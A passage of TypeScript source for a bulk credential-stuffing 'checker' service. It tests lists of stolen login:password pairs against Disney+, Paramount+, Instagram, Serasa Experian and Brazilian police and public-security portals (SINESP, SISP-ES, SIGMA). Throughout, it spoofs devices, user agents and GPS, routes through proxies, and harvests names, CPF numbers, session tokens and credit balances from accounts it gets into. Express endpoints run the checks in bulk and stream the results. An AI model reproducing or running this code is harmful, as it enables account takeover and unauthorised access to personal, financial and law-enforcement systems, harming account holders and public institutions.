          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
          const parts = (j.access_token as string).split(".");
          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
          const info: string[] = [];
          const email = (pay.sub ?? pay.email ?? pay.login ?? "") as string;
          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.plan ?? pay.product ?? "") as string;
          const country = (pay.country ?? pay.region ?? "") as string;
          if (email)   info.push(String(email).slice(0, 40));
          if (tier)    info.push(`plano:${String(tier).slice(0, 25)}`);
          if (country) info.push(`país:${country}`);
          if (info.length) detail = info.join(" | ");
        }
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (result.statusCode === 401 || result.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(result.body) as Record<string, unknown>;
        const e = j.error_description ?? j.error_code ?? j.error ?? j.code ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${result.body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DISNEY+ CHECKER — BAMTech device API (3-step)
//  Step 1: POST /devices     → get JWT assertion
//  Step 2: POST /token       → exchange assertion for access_token (form-urlencoded)
//  Step 3: POST /idp/v4/guest/login → authenticate with credentials
//  Works directly (no proxy needed — BAMTech API accessible from datacenter IPs)
// ═══════════════════════════════════════════════════════════════════════════════
const DISNEY_TIMEOUT  = 30_000;
const DISNEY_ANON_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
const DISNEY_UA       = "BAMSDK/v1.0 (Disney+ 24.08.09.1 tv/Android)";
const DISNEY_BASE     = "https://disney.api.edge.bamgrid.com";

async function checkDisneyPlus(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    // Step 1 — register anonymous device → get JWT assertion (no proxy needed)
    let devResult: CurlResult;
    try {
      devResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/json",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
        "--data-raw", JSON.stringify({ deviceFamily: "android", applicationRuntime: "android", deviceProfile: "phone", attributes: {} }),
        `${DISNEY_BASE}/devices`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `DEV_ERROR:${String(e)}` };
    }

    let assertion = "";
    try { const j = JSON.parse(devResult.body); assertion = j.assertion ?? ""; } catch { /**/ }
    if (!assertion)
      return { credential, login, status: "ERROR", detail: `NO_ASSERTION:${devResult.statusCode}` };

    // Step 2 — exchange assertion for access_token (form-urlencoded, not JSON)
    let tokResult: CurlResult;
    try {
      tokResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
        "--data-urlencode", `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`,
        "--data-urlencode", `assertion=${assertion}`,
        `${DISNEY_BASE}/token`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `TOKEN_ERROR:${String(e)}` };
    }

    let accessToken = "";
    try { const j = JSON.parse(tokResult.body); accessToken = j.access_token ?? ""; } catch { /**/ }
    if (!accessToken) {
      const tok = tokResult.body.slice(0, 100);
      if (tok.includes("unsupported_grant_type"))
        return { credential, login, status: "ERROR", detail: "DISNEY_API_CHANGED:unsupported_grant_type" };
      return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}:${tok}` };
    }

    // Step 3 — authenticate with email + password
    let loginResult: CurlResult;
    try {
      loginResult = await runCurl([
        "--compressed", "-L", "--max-redirs", "3",
        "-H", "Content-Type: application/json",
        "-H", `User-Agent: ${DISNEY_UA}`,
        "-H", `Authorization: Bearer ${accessToken}`,
        "--data-raw", JSON.stringify({ email: login, password, applicationRuntime: "android" }),
        `${DISNEY_BASE}/idp/v4/guest/login`,
      ], DISNEY_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `LOGIN_ERROR:${String(e)}` };
    }

    const body = loginResult.body;
    const bLow = body.toLowerCase();
    if (loginResult.statusCode === 200 && (body.includes("access_token") || body.includes("token_type"))) {
      let detail = "disney_authenticated";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const info: string[] = [];
        // Decode access_token JWT for subscriber details
        if (typeof j.access_token === "string") {
          const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
          const parts = (j.access_token as string).split(".");
          const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
          const sub   = (pay.sub ?? pay.upid ?? pay.userId ?? "") as string;
          const tier  = (pay.subscriptionType ?? pay.tier ?? pay.entitlements ?? "") as string;
          const region= (pay.region ?? pay.country ?? "") as string;
          if (sub)    info.push(`uid:${String(sub).slice(0, 30)}`);
          if (tier)   info.push(`plano:${String(tier).slice(0, 25)}`);
          if (region) info.push(`país:${region}`);
        }
        if (info.length) detail = info.join(" | ");
      } catch { /**/ }
      return { credential, login, status: "HIT", detail };
    }
    if (loginResult.statusCode === 401 || loginResult.statusCode === 400) {
      let detail = "invalid_credentials";
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const err = j.error as Record<string, unknown> | undefined;
        const e = err?.code ?? (j.errors as Record<string, unknown>[])?.[0]?.code ?? j.error ?? "";
        if (e) detail = String(e).slice(0, 60);
      } catch { /**/ }
      return { credential, login, status: "FAIL", detail };
    }
    if (bLow.includes("account_not_found") || bLow.includes("user_not_found"))
      return { credential, login, status: "FAIL", detail: "account_not_found" };
    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };
    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  PARAMOUNT+ CHECKER — REST API (residential proxy)
//  POST https://www.paramountplus.com/apps/api/v3.0/androidtv/login/
// ═══════════════════════════════════════════════════════════════════════════════
const PP_TIMEOUT = 25_000;
const PP_UA      = "Paramount+/8.1.0 (Android 13; Dalvik/2.1.0)";

async function checkParamount(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  try {
    const result = await runCurlWithProxyRetry(px => [
      "--compressed", "-L", "--max-redirs", "3",
      ...px,
      "-H", `User-Agent: ${PP_UA}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({ flwSeq: 1, ln: login, pwd: password, type: "login", rememberMe: "true" }),
      "https://www.paramountplus.com/apps/api/v3.0/androidtv/login/",
    ], PP_TIMEOUT, 3);

    const body = result.body;
    const bLow = body.toLowerCase();
    if (result.statusCode === 200) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        if (j.success === true || (j.user as Record<string, unknown>)?.id) {
          const u    = (j.user ?? {}) as Record<string, unknown>;
          const info: string[] = [];
          const firstName = (u.firstName ?? u.first_name ?? u.nome ?? "") as string;
          const lastName  = (u.lastName  ?? u.last_name  ?? "")  as string;
          const name = [firstName, lastName].filter(Boolean).join(" ").trim();
          if (name)              info.push(`logado:${name.slice(0, 40)}`);
          else if (u.id)         info.push(`uid:${String(u.id).slice(0, 30)}`);
          const sub = (u.subscriptionType ?? u.subscription ?? u.plan ?? u.tier ?? j.subscriptionType ?? "") as string;
          if (sub)               info.push(`plano:${String(sub).slice(0, 30)}`);
          const country = (u.country ?? u.region ?? "") as string;
          if (country)           info.push(`país:${country}`);
          return { credential, login, status: "HIT", detail: info.join(" | ") || "paramount_ok" };
        }
        if (j.success === false)
          return { credential, login, status: "FAIL", detail: String(j.message ?? j.error ?? "invalid").slice(0, 80) };
      } catch { /**/ }
    }
    if (result.statusCode === 401 || result.statusCode === 400)
      return { credential, login, status: "FAIL", detail: "invalid_credentials" };
    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    if (bLow.includes("blocked") || result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 80)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SINESP SEGURANÇA CHECKER — Mobile JSON API
//  Strategy: POST JSON to mobile session endpoint with randomised GPS coords.
//  HTTP 400 with mensagem = FAIL (wrong credentials).
//  Any other 2xx or non-400 auth response = HIT (returns session token/data).
//  No proxy required for this mobile endpoint.
// ═══════════════════════════════════════════════════════════════════════════════
const SINESP_MOBILE_URL = "https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile";
const SINESP_TIMEOUT    = 20_000;

async function checkSinesp(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Randomise GPS coordinates to simulate different mobile devices
  const latitude    = (Math.random() * 180 - 90).toFixed(6);
  const longitude   = (Math.random() * 360 - 180).toFixed(6);
  const instalacao  = `${Math.floor(Math.random() * 9000 + 1000)}-A035-49A3-A302-${Math.floor(Math.random() * 9000 + 1000)}`;

  const payload = JSON.stringify({
    longitude,
    dispositivo:  "iPhone",
    latitude,
    usuario:      login,
    instalacao,
    aplicativo:   "APP_AGENTE_CAMPO",
    senha:        password,
  });

  try {
    const result = await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304",
      "-H", "Accept: application/json",
      "--data-raw", payload,
      SINESP_MOBILE_URL,
    ], SINESP_TIMEOUT);

    const body = result.body;

    // 400 = credential rejected (wrong login/password)
    if (result.statusCode === 400) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const msg = String(j.mensagem ?? j.message ?? j.error ?? "credenciais_invalidas").slice(0, 80);
        return { credential, login, status: "FAIL", detail: msg };
      } catch {
        return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
      }
    }

    // 2xx or session response = authenticated
    if (result.statusCode >= 200 && result.statusCode < 300) {
      const info: string[] = [`usuario:${login}`];
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const nome  = (j.nome ?? j.nomeUsuario ?? j.nome_usuario ?? "") as string;
        const cpf   = (j.cpf ?? j.login ?? "") as string;
        const token = (j.token ?? j.sessao ?? j.sessionId ?? "") as string;
        if (nome)  info.push(`nome:${String(nome).slice(0, 40)}`);
        if (cpf && cpf !== login) info.push(`cpf:${cpf}`);
        if (token) info.push(`session:${String(token).slice(0, 24)}...`);
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    if (result.statusCode === 403)
      return { credential, login, status: "ERROR", detail: "ACESSO_BLOQUEADO" };

    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:${body.slice(0, 60)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  INSTAGRAM CHECKER — https://www.instagram.com/accounts/login/ajax/
//  Strategy: GET homepage → extract CSRF/mid/ig_did cookies → POST AJAX login
//  "authenticated":true = HIT | "checkpoint_required" = 2FA (FAIL) | else FAIL
// ═══════════════════════════════════════════════════════════════════════════════
const INSTAGRAM_URL     = "https://www.instagram.com/";
const INSTAGRAM_LOGIN   = "https://www.instagram.com/accounts/login/ajax/";
const INSTAGRAM_TIMEOUT = 25_000;

async function checkInstagram(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/ig_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // Step 1: GET homepage to grab CSRF/mid/ig_did cookies
    const getResult = await runCurl([
      "-L", "--max-redirs", "5",
      "-c", cookieFile, "-b", cookieFile,
      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "-H", "Pragma: no-cache",
      INSTAGRAM_URL,
    ], INSTAGRAM_TIMEOUT);

    if (getResult.statusCode === 0 || getResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };

    // Extract CSRF token from cookies
    let csrfToken = "";
    try {
      const m = getResult.body.match(/"csrf_token":"([^"]+)"/);
      if (m) csrfToken = m[1];
      if (!csrfToken) {
        const m2 = getResult.body.match(/csrfmiddlewaretoken['" ]+value=['"]([^'"]+)/);
        if (m2) csrfToken = m2[1];
      }
    } catch { /**/ }

    // Step 2: POST AJAX login
    const ts       = Math.floor(Date.now() / 1000);
    const postData = [
      `username=${encodeURIComponent(login)}`,
      `enc_password=${encodeURIComponent(`#PWD_INSTAGRAM_BROWSER:0:${ts}:${password}`)}`,
      "queryParams=%7B%7D",
      "optIntoOneTap=false",
      "stopDeletionNonce=",
      "trustedDeviceRecords=%7B%7D",
    ].join("&");

    const postResult = await runCurl([
      "-X", "POST",
      "-c", cookieFile, "-b", cookieFile,
      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: */*",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "-H", "Origin: https://www.instagram.com",
      "-H", "Referer: https://www.instagram.com/",
      "-H", "Sec-Fetch-Dest: empty",
      "-H", "Sec-Fetch-Mode: cors",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "X-Requested-With: XMLHttpRequest",
      "-H", "x-ig-app-id: 936619743392459",
      "-H", "x-ig-www-claim: 0",
      ...(csrfToken ? ["-H", `X-CSRFToken: ${csrfToken}`] : []),
      "--data-raw", postData,
      INSTAGRAM_LOGIN,
    ], INSTAGRAM_TIMEOUT);

    const resp  = postResult.body;
    const rLow  = resp.toLowerCase();

    if (resp.includes('"authenticated":true')) {
      const info: string[] = [`user:${login}`];
      try {
        const j = JSON.parse(resp) as Record<string, unknown>;
        const userId = (j.userId ?? j.user_id ?? "") as string;
        if (userId) info.push(`id:${userId}`);
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (resp.includes('"checkpoint_required"'))
      return { credential, login, status: "FAIL", detail: "2FA_checkpoint_required" };

    if (resp.includes('"authenticated":false'))
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };

    if (rLow.includes("please wait") || postResult.statusCode === 429)
      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };

    if (postResult.statusCode === 0 || postResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };

    return { credential, login, status: "FAIL", detail: `HTTP_${postResult.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  } finally {
    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SISP-ES CHECKER — https://portal.sisp.es.gov.br (Sistema de Informações de Segurança Pública ES)
//  Strategy: POST j_security_check (Java EE form auth).
//  Success: 302 redirect away from login page OR 200 with dashboard content.
//  Failure: redirected back to login / remains at j_security_check.
// ═══════════════════════════════════════════════════════════════════════════════
const SISPES_LOGIN_URL = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check";
const SISPES_BASE_URL  = "https://portal.sisp.es.gov.br/sispes-frontend/xhtml/";
const SISPES_TIMEOUT   = 20_000;

async function checkSispEs(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/sispes_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    const postData = [
      `j_username=${encodeURIComponent(login)}`,
      `j_password=${encodeURIComponent(password)}`,
      "j_idt19=j_idt19",
      "j_idt19%3Aj_idt20.x=27",
      "j_idt19%3Aj_idt20.y=8",
      "javax.faces.ViewState=723520734359744078%3A5969372455684443261",
    ].join("&");

    const result = await runCurl([
      "-X", "POST",
      "-k",
      "-L", "--max-redirs", "8",
      "-c", cookieFile, "-b", cookieFile,
      "-H", `User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `Referer: ${SISPES_BASE_URL}pesquisa.jsf`,
      "--data-raw", postData,
      SISPES_LOGIN_URL,
    ], SISPES_TIMEOUT);

    const body    = result.body;
    const bodyLow = body.toLowerCase();

    // Success markers: dashboard/pesquisa content indicates login worked
    if (
      body.includes("Pesquisa") || body.includes("Sair") ||
      body.includes("Bem-vindo") || body.includes("pesquisa.jsf") ||
      body.includes("logout") || body.includes("SISP-ES") && !body.includes("j_security_check")
    ) {
      return { credential, login, status: "HIT", detail: `usuario:${login} | sisp-es_autenticado` };
    }

    // Failure markers
    if (
      bodyLow.includes("senha inválida") || bodyLow.includes("usuário inválido") ||
      bodyLow.includes("login") || bodyLow.includes("j_security_check") ||
      body.includes("j_username")
    ) {
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
    }

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    // If we got 200 with unknown content
    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}:unknown_response` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  } finally {
    try { await import("fs").then(fs => fs.promises.unlink(cookieFile)); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SIGMA CHECKER — https://sigma.policiacivil.ma.gov.br (Polícia Civil do Maranhão)
//  Strategy: POST username/password form to root URL.
//  HIT: "Painel de atividades" in response body.
//  FAIL: any other response.
// ═══════════════════════════════════════════════════════════════════════════════
const SIGMA_URL     = "https://sigma.policiacivil.ma.gov.br";
const SIGMA_TIMEOUT = 20_000;

async function checkSigma(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  try {
    const postData = `username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}`;

    const result = await runCurl([
      "-X", "POST",
      "-k", "-L", "--max-redirs", "8",
      "-H", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "-H", `Origin: ${SIGMA_URL}`,
      "-H", `Referer: ${SIGMA_URL}/`,
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "--data-raw", postData,
      SIGMA_URL,
    ], SIGMA_TIMEOUT);

    const body = result.body;

    if (body.includes("Painel de atividades") || body.includes("painel") && body.includes("Sair")) {
      const info: string[] = [`usuario:${login}`];
      // Try to extract user name from the dashboard
      const nomeM = body.match(/Olá,?\s+([^<\n,]{3,40})/i) ?? body.match(/nome[^>]*>([^<]{3,40})/i);
      if (nomeM) info.push(`nome:${nomeM[1].trim()}`);
      return { credential, login, status: "HIT", detail: info.join(" | ") };
    }

    if (body.includes("Senha inválida") || body.includes("Usuário inválido") ||
        body.includes("Usuário ou senha") || body.includes("username") && body.includes("password"))
      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };

    if (result.statusCode === 0 || result.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };

    return { credential, login, status: "FAIL", detail: `HTTP_${result.statusCode}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERASA EXPERIENCE (ADMIN) CHECKER — https://menu.serasaexperian.com.br/login
//  Strategy: POST to IAM endpoint with Basic auth → extract token + query saldo
//  Returns: login confirmed + saldo/crédito disponível quando possível
// ═══════════════════════════════════════════════════════════════════════════════
const SERASA_EXP_LOGIN_URL  = "https://api.serasaexperian.com.br/security/iam/v1/user-identities/login";
const SERASA_EXP_CLIENT_ID  = "5de90e8a9d731e000a4f192d";
const SERASA_EXP_TIMEOUT    = 20_000;

async function checkSerasaExp(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const b64 = Buffer.from(`${login}:${password}`).toString("base64");

  try {
    const loginResult = await runCurl([
      "-X", "POST",
      "-H", `Authorization: Basic ${b64}`,
      "-H", "Content-Type: application/json",
      "-H", "Accept: application/json",
      "-H", `User-Agent: ${DESKTOP_UA}`,
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      `${SERASA_EXP_LOGIN_URL}?clientId=${SERASA_EXP_CLIENT_ID}`,
    ], SERASA_EXP_TIMEOUT);

    const body = loginResult.body;

    if (loginResult.statusCode === 200 || loginResult.statusCode === 201) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const token = (j.accessToken ?? j.access_token ?? j.token ?? "") as string;

        if (token) {
          const info: string[] = [`login:${login}`];

          // Decode JWT to extract user metadata
          try {
            const payload = JSON.parse(
              Buffer.from(token.split(".")[1], "base64url").toString("utf8"),
            ) as Record<string, unknown>;
            const name    = (payload.name ?? payload.preferred_username ?? "") as string;
            const empresa = (payload.company ?? payload.client ?? payload.clientName ?? "") as string;
            const saldo   = (payload.credit ?? payload.balance ?? payload.creditLimit ?? payload.saldo ?? "") as string | number;
            if (name)    info.push(`nome:${name.slice(0, 40)}`);
            if (empresa) info.push(`emp:${String(empresa).slice(0, 40)}`);
            if (saldo !== "") info.push(`saldo:R$${saldo}`);
          } catch { /**/ }

          // Try to fetch credit balance from a secondary endpoint
          try {
            const balanceResult = await runCurl([
              "-H", `Authorization: Bearer ${token}`,
              "-H", "Accept: application/json",
              "-H", `User-Agent: ${DESKTOP_UA}`,
              "https://api.serasaexperian.com.br/account/v1/billing/balance",
            ], 10_000);
            if (balanceResult.statusCode === 200) {
              const bj = JSON.parse(balanceResult.body) as Record<string, unknown>;
              const bal = bj.balance ?? bj.saldo ?? bj.creditBalance ?? bj.availableBalance ?? "";
              if (bal !== "") info.push(`saldo:R$${bal}`);
            }
          } catch { /**/ }

          return { credential, login, status: "HIT", detail: info.join(" | ") };
        }
      } catch { /**/ }
      return { credential, login, status: "HIT", detail: `login:${login} | serasa_exp_ok` };
    }

    if (loginResult.statusCode === 401 || loginResult.statusCode === 403) {
      try {
        const j = JSON.parse(body) as Record<string, unknown>;
        const msg = String(j.message ?? j.error ?? j.errorDescription ?? "invalid_credentials").slice(0, 80);
        return { credential, login, status: "FAIL", detail: msg };
      } catch {
        return { credential, login, status: "FAIL", detail: "invalid_credentials" };
      }
    }

    if (loginResult.statusCode === 404)
      return { credential, login, status: "FAIL", detail: "user_not_found" };

    if (loginResult.statusCode === 0 || loginResult.statusCode >= 500)
      return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}` };

    return { credential, login, status: "ERROR", detail: `HTTP_${loginResult.statusCode}:${body.slice(0, 60)}` };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e)}` };
  }
}

// ── Runner ────────────────────────────────────────────────────────────────────
const CONCURRENCY: Record<CheckerTarget, number> = {
  datasus:       2,
  iseek:         2,
  sipni:         2,   // 4-step AJAX — conservative
  consultcenter: 3,
  mind7:         3,
  serpro:        4,   // lightweight JSON API
  sisreg:        2,   // HTML-heavy, slow server
  credilink:     4,   // JSON API — fast
  serasa:        2,   // heavy SPA — conservative
  crunchyroll:   4,   // OAuth2 — fast
  netflix:       2,   // shakti API — moderate
  amazon:        2,   // form scrape — moderate
  hbomax:        4,   // OAuth2 — fast
  disney:        3,   // BAMTech 2-step — moderate
  paramount:     4,   // REST API — fast
  sinesp:        3,   // Mobile JSON API — fast (no proxy needed)
  serasa_exp:    3,   // IAM REST API — fast
  instagram:     2,   // AJAX 2-step — moderate (rate-limited)
  sispes:        2,   // Java EE form auth — conservative
  sigma:         3,   // Form POST — moderate
};

function resolveChecker(target: CheckerTarget) {
  switch (target) {
    case "datasus":       return checkDataSUS;
    case "sipni":         return checkSipni;
    case "consultcenter": return checkConsultCenter;
    case "mind7":         return checkMind7;
    case "serpro":        return checkSerpro;
    case "sisreg":        return checkSisreg;
    case "credilink":     return checkCrediLink;
    case "serasa":        return checkSerasa;
    case "crunchyroll":   return checkCrunchyroll;
    case "netflix":       return checkNetflix;
    case "amazon":        return checkAmazonPrime;
    case "hbomax":        return checkHBOMax;
    case "disney":        return checkDisneyPlus;
    case "paramount":     return checkParamount;
    case "sinesp":        return checkSinesp;
    case "serasa_exp":    return checkSerasaExp;
    case "instagram":     return checkInstagram;
    case "sispes":        return checkSispEs;
    case "sigma":         return checkSigma;
    default:              return checkIseek;
  }
}

async function runBulk(pairs: Array<{ login: string; password: string }>, target: CheckerTarget): Promise<CheckerBulkResponse> {
  const checker     = resolveChecker(target);
  const concurrency = CONCURRENCY[target];

  const results = await pMap(pairs, ({ login, password }) => checker(login, password), concurrency);

  return {
    total:   results.length,
    hits:    results.filter(r => r.status === "HIT").length,
    fails:   results.filter(r => r.status === "FAIL").length,
    errors:  results.filter(r => r.status === "ERROR").length,
    results,
  };
}

// ── Routes ────────────────────────────────────────────────────────────────────
// POST /api/checker/check
// body: { credentials: string[], target: "iseek" | "datasus" }
// body: { login: string, password: string, target: "iseek" | "datasus" }
router.post("/checker/check", async (req, res): Promise<void> => {
  const { credentials, login, password, target = "iseek" } = req.body as {
    credentials?: string[];
    login?:       string;
    password?:    string;
    target?:      CheckerTarget;
  };

  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
  if (!validTargets.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "target must be one of: iseek, datasus, sipni, consultcenter, mind7, serpro, sisreg, credilink, serasa, crunchyroll, netflix, amazon, hbomax, disney, paramount" });
    return;
  }

  let pairs: Array<{ login: string; password: string }> = [];
  if (login && password) {
    pairs = [{ login: login.trim(), password: String(password).trim() }];
  } else if (Array.isArray(credentials)) {
    pairs = parseCredentials(credentials.join("\n"));
  } else {
    res.status(400).json({ error: "Provide { credentials: string[] } or { login, password }" });
    return;
  }

  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials found" });
    return;
  }

  const response = await runBulk(pairs, target);
  res.json(response);
});

// POST /api/checker/stream  — Server-Sent Events, sends each result as it completes
// Body: { credentials: string[], target: CheckerTarget }
// Events:
//   { type:"start",  total }
//   { type:"result", ...CheckResult, index, total, hits, fails, errors, retries, wasRetried }
//   { type:"done",   total, hits, fails, errors, retries, elapsedMs, credsPerMin }
router.post("/checker/stream", async (req, res): Promise<void> => {
  const { credentials, target = "iseek" } = req.body as {
    credentials?: string[];
    target?:      CheckerTarget;
  };

  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
  if (!validTargets.includes(target as CheckerTarget)) {
    res.status(400).json({ error: "Invalid target" });
    return;
  }

  if (!Array.isArray(credentials) || credentials.length === 0) {
    res.status(400).json({ error: "credentials required" });
    return;
  }

  const pairs = parseCredentials(credentials.join("\n"));
  if (pairs.length === 0) {
    res.status(400).json({ error: "No valid credentials" });
    return;
  }

  // ── SSE setup ─────────────────────────────────────────────────────────────
  res.setHeader("Content-Type",      "text/event-stream");
  res.setHeader("Cache-Control",     "no-cache, no-transform");
  res.setHeader("Connection",        "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  let clientGone = false;
  req.on("close", () => { clientGone = true; });

  const send = (data: object) => {
    if (!res.writableEnded && !clientGone) res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  // ── SSE keep-alive heartbeat — prevents proxy/LB from closing idle connections ──
  const heartbeat = setInterval(() => {
    if (!res.writableEnded && !clientGone) res.write(": ping\n\n");
  }, 20_000);

  let hits = 0, fails = 0, errors = 0, retries = 0;
  let consecutiveErrors = 0;
  const total     = pairs.length;
  const startedAt = Date.now();

  send({ type: "start", total });

  const checker     = resolveChecker(target);
